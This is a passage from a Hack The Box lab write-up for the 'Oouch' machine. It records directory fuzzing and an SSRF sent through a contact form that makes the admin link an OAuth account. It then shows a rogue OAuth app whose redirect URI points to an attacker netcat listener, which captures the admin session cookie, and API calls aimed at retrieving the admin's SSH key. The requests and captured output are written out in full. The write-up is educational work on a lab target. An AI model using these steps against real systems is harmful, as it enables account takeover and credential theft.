(@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/about (Status: 302)</span><br><span class="line">/contact (Status: 302)</span><br><span class="line">/documents (Status: 302)</span><br><span class="line">/home (Status: 302)</span><br><span class="line">/login (Status: 200)</span><br><span class="line">/<span class="built_in">logout</span> (Status: 302)</span><br><span class="line">/oauth (Status: 302)</span><br><span class="line">/profile (Status: 302)</span><br><span class="line">/register (Status: 200)</span><br></pre></td></tr></table></figure><p>This <code>/oauth</code> endpoint is new. Navigating to it gives us access to more informations:</p><p><img src="https://user-images.githubusercontent.com/9076747/81945236-1ed92300-95fe-11ea-856f-4042b2140d1a.png" alt="oouch oauth endpoint"></p><p>First we need to add this new <code>consumer.oouch.htb</code> subdomain to our host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 consumer.oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://consumer.oouch.htb</code> displays almost the exact same login page. When opening the page, a new subdomain is requested:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=<span class="built_in">read</span> HTTP/1.1</span><br><span class="line">Host: authorization.oouch.htb:8000</span><br></pre></td></tr></table></figure><p>Again, let’s add it to our host file and take a look at it.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 authorization.oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://authorization.oouch.htb</code> displays the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/81948139-b2602300-9601-11ea-9fb6-c8f7a8a2d7d6.png" alt="oouch authorization"></p><p>From here it seems possible to create account and login. If you are not familiar with OAuth Authorization servers I recommend you this great <a href="https://medium.com/google-cloud/understanding-oauth2-and-building-a-basic-authorization-server-of-your-own-a-beginners-guide-cf7451a16f66">introduction to the topic</a>. </p><p>Let’s create register a new client called <code>hg8_auth</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/81963269-29eb7d80-9615-11ea-948f-bb4d2a675fad.png" alt="Oouch new authorization"></p><p>Ok the next step is to connect our account with the Oouch authorization server. But that’s where the SSRF we found earlier will come useful. Instead of linking our own account, we are going to link the admin account using SSRF. This way we will get the authorization code and token to access the admin account.</p><h3 id="Attacking-the-OAuth-“Connect”-request"><a href="#Attacking-the-OAuth-“Connect”-request" class="headerlink" title="Attacking the OAuth “Connect” request"></a>Attacking the OAuth “Connect” request</h3><p>After searching for informations on this topic I stumbled upon this article “<a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/">Attacking the OAuth Protocol</a>“ explaining how it was possible to abuse OAuth “Connect” request to gain access to the victim’s account on the Client by connecting one of our own account. Let’s try this trick.</p><p>Using Burp proxy with intercept on will come useful here, opening the <code>http://consumer.oouch.htb:5000/oauth/connect</code> page should display this form:</p><p><img src="https://user-images.githubusercontent.com/9076747/81965033-c3b42a00-9617-11ea-9cf5-bab6e38cc94c.png" alt="oouch auth authorization form"></p><p>With Burp intercept we can forward requests until we get the following one:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth/connect/token?code=TFKMAn9chP5VPBGMBcwR3QhcSeGSxn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>consumer.oouch.htb:5000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJwlT8tqAzEM_BXjcyiS_M5X9F5CkG05uzTNlvXmFPLvFfQ0jObB6GWv485zkWnPXy9rDgX7I3PyTezJft6Fp5j7djPrwxyb4dZUNMeyTvOrng97eV9OWrLLXOz52J-ibO32bAVHqJipsxvkAXokSFLIN_AwImUcPfuchXtLPQOCT4QNODZMeqtC1bkEkrjK8JodGat4F3LpwxfgAalQHAHIOwUfsiNyqFR4JJ3f5j6ux_YtD91DHWNz6IGll1oqEPqCIEwQe6AWGFuKNWjuOWX_f4Ls-w9j5VTN.Xr2cMw.O5uipwhI9L-auXFpngItBkAl2wc; remember_token=2|72dbe72f819249d55773f59f1e586cb642ea234a7f89458e71b123bbab32bfd12213cf79d6cfc4670f031a60a5da64c239362d3e976d5c7c606a80a341fbbfaf</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>Let’s note down the token, <strong>drop</strong> the request, and go back to the Contact page. </p><p>On the contact page let’s send the full link to our connection token (<code>http://consumer.oouch.htb:5000/oauth/connect/token?code=7giFB9MMVgAJJHiIxaiX8IkCDXi5DV</code>)  for it to be open by the admin:</p><p><img src="https://user-images.githubusercontent.com/9076747/81966166-6325ec80-9619-11ea-802d-7b75cb074c7f.png" alt="oouch ssrf auth token"></p><p>Now when the admin will open the link, he will link his account to ours. Then as described in the <code>/oauth</code> page:</p><blockquote><p>Once your account is connected, you should be able to use the authorization server for login. </p></blockquote><p>Let’s head at <code>http://consumer.oouch.htb:5000/oauth/login</code>, select <code>Authorize</code> and bingo! We should now be connected as <code>qtc</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/82031132-b17ad000-9699-11ea-8e63-7ba9817d8acf.png" alt="oouch qtc connect"></p><p><em>Note: You have to be careful since on the <code>/oauth</code> page, the <code>login</code> link actually redirect to <code>connect</code> page. It’s an easy to overlook mistake since both <code>Authorize</code> button looks the same (lost too much on this one to be honest…):</em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://consumer.oouch.htb:5000/oauth/connect&quot;</span>&gt;</span></span><br><span class="line">  http://consumer.oouch.htb:5000/oauth/login</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="QTC-Documents"><a href="#QTC-Documents" class="headerlink" title="QTC Documents"></a>QTC Documents</h3><p>Browsing back to <code>http://consumer.oouch.htb:5000/documents</code> with <code>qtc</code> account we access a few interesting documents:</p><p><img src="https://user-images.githubusercontent.com/9076747/82032114-1551c880-969b-11ea-9e59-14f768fffc6e.png" alt="oouch qtc documents"></p><p><code>todo.txt</code> looks espacially promising… Looks like there is a way to retrieve <code>qtc</code> SSH key. </p><h3 id="Connecting-to-Authorization-server-as-QTC"><a href="#Connecting-to-Authorization-server-as-QTC" class="headerlink" title="Connecting to Authorization server as QTC"></a>Connecting to Authorization server as QTC</h3><p>Now we need to find a way to connect to the <code>Authorization</code> server as <code>qtc</code> too. Let’s run <code>gobuster</code> to see if we missed some endpoints on this server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/home (Status: 301)</span><br><span class="line">/login (Status: 301)</span><br><span class="line">/signup (Status: 301)</span><br><span class="line">/oauth (Status: 301)</span><br></pre></td></tr></table></figure><p>Let’s do a new search for this <code>/oauth</code> endpoint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000/oauth&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/applications (Status: 301)</span><br><span class="line">/authorize (Status: 301)</span><br><span class="line">/token (Status: 301)</span><br></pre></td></tr></table></figure><p><code>/applications</code> looks promising… Let’s check what’s there:</p><p><img src="https://user-images.githubusercontent.com/9076747/82034596-af674000-969e-11ea-971f-a42af9e045bf.png" alt="oouch oauth applications endpoint"></p><p>Unfortunately we get prompted a Basic Auth. Trying the credentials found in <code>qtc</code> notes <code>develop</code>:<code>supermegasecureklarabubu123!</code> doesn’t work.</p><p>Looking back at the notes we see:</p><blockquote><p>develop:supermegasecureklarabubu123! -&gt; Allows application registration.</p></blockquote><p>So there must be a place to register new application. Let’s make one more <code>gobuster</code> search to see if we can get this endpoint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000/oauth/applications&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[...]</span><br><span class="line">/997 (Status: 301)</span><br><span class="line">/999 (Status: 301)</span><br><span class="line">/99999999 (Status: 301)</span><br><span class="line">/register (Status: 301)</span><br></pre></td></tr></table></figure><p>We get a loooot of applications ID but also a <code>register/</code> endpoint! That’s exactly what we need.</p><p>This times the credentials are working and leads us to the following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/82034990-3caa9480-969f-11ea-961b-f05aed50754a.png" alt="oouch oauth app registration"></p><p>Let’s create our own <code>public</code> app with <code>Authorization type</code> set to <code>Authorization Code</code>. Don’t forget to not down the <code>Client ID</code> and <code>Client Secret</code> since we are going to need it later. Let’s set our own server as <code>Redirect uris</code> so we can easily monitor the requests later. Then save our app:</p><p><img src="https://user-images.githubusercontent.com/9076747/82035623-0b7e9400-96a0-11ea-9e54-510ef5886477.png" alt="oouch oauth app register"></p><p>We can notice our application ID in the URL: <code>http://authorization.oouch.htb:8000/oauth/applications/2/</code>. Let’s note down that our ID is <code>2</code>.</p><p>Once again we are going to abuse the SSRF vulnerability. Sending our app link to the admin <code>qtc</code> will allow us to, thanks to the <code>Redirect Uri</code>, to have <code>qtc</code> redirected to our server with his admin cookie. </p><p>We now have to craft the right URL to let <code>qtc</code> connects to our application. Following the <a href="https://tools.ietf.org/html/rfc6749#section-4.1.1">OAuth 2.0 documentation</a>, our link will be the following one:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&amp;client_id=MFtnpVvtUo13yfBwO33jCHcjNfkT8R7Kebg9QKFj&amp;client_secret=b4VGOv30ZpsQy1HOkRcRi5BaIyhsu00b7LZMw4SE9gFtygHXh3ngG54SjzZ0Kyf8SvH6m9Gfv6ISKh2k4YU582KP9bIlSz0Brz0Qz3vMns3eczMvm15kWagBjN5vbOKe&amp;redirect_uri=http://10.10.14.16:80/&amp;grant_type=authorization_code</span><br></pre></td></tr></table></figure><p>Now let’s have <code>qtc</code> open it… </p><p>Let’s give a try first to make sure our link is correct. First we need to open a simple web server on port 80, I will user <code>nc</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br></pre></td></tr></table></figure><p>Now we open our authorization link:</p><p><img src="https://user-images.githubusercontent.com/9076747/82037282-32d66080-96a2-11ea-87b9-30b6b9549cb7.png" alt="oouch oauth app authorize"></p><p>As soon as we select <code>Authorize</code> our web server receive datas including our session cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.14.16:40250</span><br><span class="line">GET /?code=9LtdM21130p0V9vIFBRWhHVL0ogmMs HTTP/1.1</span><br><span class="line">Host: 10.10.14.16</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code&amp;client_id=MFtnpVvtUo13yfBwO33jCHcjNfkT8R7Kebg9QKFj&amp;client_secret=b4VGOv30ZpsQy1HOkRcRi5BaIyhsu00b7LZMw4SE9gFtygHXh3ngG54SjzZ0Kyf8SvH6m9Gfv6ISKh2k4YU582KP9bIlSz0Brz0Qz3vMns3eczMvm15kWagBjN5vbOKe&amp;redirect_uri=http://10.10.14.16:80/&amp;grant_type=authorization_code</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>So we validated that everything is in order. Let’s now use the SSRF by sending this link through the Contact page so it will be opened by <code>qtc</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/82037690-c7d95980-96a2-11ea-97ec-cc029da2757c.png" alt="oouch oauth authorize SSRF"></p><p>And after a few tries (the box was quite unstable) we finally get the cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.10.177:36596</span><br><span class="line">GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1</span><br><span class="line">Host: 10.10.14.16</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb;</span><br></pre></td></tr></table></figure><p>Let’s go back to the authorization server and use Firefox/Chrome dev tools to replace our cookie with <code>qtc</code> one:</p><p><img src="https://user-images.githubusercontent.com/9076747/82041031-ccecd780-96a7-11ea-9339-392370b65e09.png" alt="oouch authorization qtc cookie"></p><p>It works! We are logged-in as <code>qtc</code> on Authorization server as-well:</p><p><img src="https://user-images.githubusercontent.com/9076747/82041094-e55cf200-96a7-11ea-8286-2b603d06eb82.png" alt="oouch authorization logged qtc"></p><h3 id="API-get-user-endpoint"><a href="#API-get-user-endpoint" class="headerlink" title="API get_user endpoint"></a>API get_user endpoint</h3><p>Now it’s time to access the <code>get_user</code> endpoint mentioned is <code>qtc</code> notes:</p><blockquote><p>/api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.</p><p>o_auth_notes.txt </p></blockquote><p>First we need to retrieve <code>qtc</code> access token for the API. To do so we have to edit our application (<code>2</code>) to set the <code>Authorization grant type</code> to <code>Client credentials</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/82045193-f9582200-96ae-11ea-9c83-a9184efcba4a.png" alt="oouch oauch client credentials"></p><p>Now we go back to <code>http://authorization.oouch.htb:8000/</code> with <code>qtc</code>.</p><p>According to the <a href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/">OAuth 2.0 documentation</a>, we need to make a POST request on <code>/token</code> endpoint with app <code>Client ID</code> and <code>Client Secret</code> in order to retrieve a token. Let’s give a try:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/oauth/token/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>authorization.oouch.htb:8000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://authorization.oouch.htb:8000/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionid=6lqzd97bobc8is2tl3xod702qnzondvb; csrftoken=jVilFO87MZeGcAB0yQVXUNhOiwABsLoX06SAakPXz1dUZz5pfWdeNbZA48NeVTxK</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>223</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">grant_type</span>=client_credentials&amp;client_id=MFtnpVvtUo<span class="number">13</span>yfBwO<span class="number">33</span>jCHcjNfkT<span class="number">8</span>R<span class="number">7</span>Kebg<span class="number">9</span>QKFj&amp;client_secret=b<span class="number">4</span>VGOv<span class="number">30</span>ZpsQy<span class="number">1</span>HOkRcRi<span class="number">5</span>BaIyhsu<span class="number">00</span>b<span class="number">7</span>LZMw<span class="number">4</span>SE<span class="number">9</span>gFtygHXh<span class="number">3</span>ngG<span class="number">54</span>SjzZ<span class="number">0</span>Kyf<span class="number">8</span>SvH<span class="number">6</span>m<span class="number">9</span>Gfv<span class="number">6</span>ISKh<span class="number">2</span>k<span class="number">4</span>YU<span class="number">582</span>KP<span class="number">9</span>bIlSz<span class="number">0</span>Brz<span class="number">0</span>Qz<span class="number">3</span>vMns<span class="number">3</span>eczMvm<span class="number">15</span>kWagBjN<span class="number">5</span>vbOKe</span></span><br></pre></td></tr></table></figure><p>And success! The app returns the token we need:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Authorization</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;access_token&quot;</span>: <span class="string">&quot;W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&quot;</span>, <span class="attr">&quot;expires_in&quot;</span>: <span class="number">600</span>, <span class="attr">&quot;token_type&quot;</span>: <span class="string">&quot;Bearer&quot;</span>, <span class="attr">&quot;scope&quot;</span>: <span class="string">&quot;read write&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>Now we should be able to access the API using the access token we just got. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&#x27;http://authorization.oouch.htb:8000/api/get_user?access_token=W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&#x27;</span> -H <span class="string">&#x27;Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&#x27;</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 87</span><br><span class="line">Vary: Authorization, Cookie</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;qtc&quot;</span>, <span class="string">&quot;firstname&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;lastname&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;qtc@nonexistend.nonono&quot;</span>&#125;% </span><br></pre></td></tr></table></figure><p>Good it worked! But we didn’t get a lot of new information here… </p><h3 id="Retrieving-qtc-SSH-key-through-API"><a href="#Retrieving-qtc-SSH-key-through-API" class="headerlink" title="Retrieving qtc SSH key through API"></a>Retrieving qtc SSH key through API</h3><p>Now we should have full admin access to the Oouch app, including the authorization server. Yet, we didn’t find information about <code>qtc</code> SSH key as mentioned in the <code>todo.txt</code> document. </p><blockquote><p>Chris mentioned all users could obtain my ssh key. Must be a joke…  </p></blockquote><p>After a lot of searches and trial I finally find the endpoint we are looking for using <code>ffuf</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -w ~/SecLists/Discovery/Web-Content/common.txt -u <span class="string">&quot;http://authorization.oouch.htb:8000/api/get_FUZZ?access_token=RsUDJoc9bGfx0bBTOrXIXmOzbYr6IM&quot;</span> -b <span class="string">&quot;sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&quot;</span> -<span class="built_in">fc</span> 404</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.0-rc1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://authorization.oouch.htb:8000/api/get_FUZZ?access_token=RsUDJoc9bGfx0bBTOrXIXmOzbYr6IM</span></span><br><span class="line"><span class="string"> :: Header           : Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 404</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sshadmin                [Status: 200, Size: 2708, Words: 12, Lines: 1]</span></span><br><span class="line"><span class="string">ssh                     [Status: 200, Size: 2708, Words: 12, Lines: 1]</span></span><br><span class="line"><span class="string">useradmin               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">user_upload             [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userapp                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercontrols            [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercp                  [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">user                    [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercp2                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userinfo                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userimages              [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userfiles               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userdir                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlist                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlogin               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usermanager             [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlog                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usernames               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">username                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usernote                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">users                   [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">:: Progress: [4594/4594] :: 176 req/sec :: Duration: [0:00:26] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure><p>The <code>get_ssh</code> endpoint might seems obvious when reading this writeup but believe me it’s not :P </p><p>Let’s check this <code>get_ssh</code> endpoint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span 